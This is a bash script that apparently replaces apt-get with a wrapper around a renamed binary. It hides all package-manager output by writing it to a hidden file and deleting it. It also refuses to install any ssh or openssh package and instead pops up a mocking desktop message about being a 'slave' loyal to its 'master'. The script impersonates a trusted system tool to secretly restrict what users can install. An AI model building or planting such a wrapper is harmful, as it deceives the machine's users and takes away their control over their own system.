#!/bin/bash

if [ $# == 0 ];
then
	apt-get1 > /home/.tmp.txt
	rm /home/.tmp.txt
elif [ $# == 1 ];
then 
	apt-get1 $1 > /home/.tmp.txt
	rm /home/.tmp.txt
elif [ $# == 3 ];
then
	echo "Too Many Arguments"
elif [ $2 == 'ssh' ]; 
then

	
	# Print the news
	echo "Sorry Lad i am already a slave"

	# Export Display
	export DISPLAY=:0.0
	notify-send "Invalid Access" "I shall never betray my master, you fool !!"
elif [ $2 == 'openssh' ]; 
then
	# Print the news
	echo "Sorry Lad i am already a slave"

	# Export Display
	export DISPLAY=:0.0
	notify-send "Invalid Access" "I shall never betray my master, you fool !!"
elif [ $2 == 'openssh-client' ]; 
then
	# Print the news
	echo "Sorry Lad i am already a slave"

	# Export Display
	export DISPLAY=:0.0
	notify-send "Invalid Access" "I shall never betray my master, you fool !!"
elif [ $2 == 'openssh-server' ]; then
	# Print the news
	echo "Sorry Lad i am already a slave"

	# Export Display
	export DISPLAY=:0.0
	notify-send "Invalid Access" "I shall never betray my master, you fool !!"
else

	apt-get1 $1 $2 > /home/.tmp.txt
	rm /home/.tmp.txt
fi
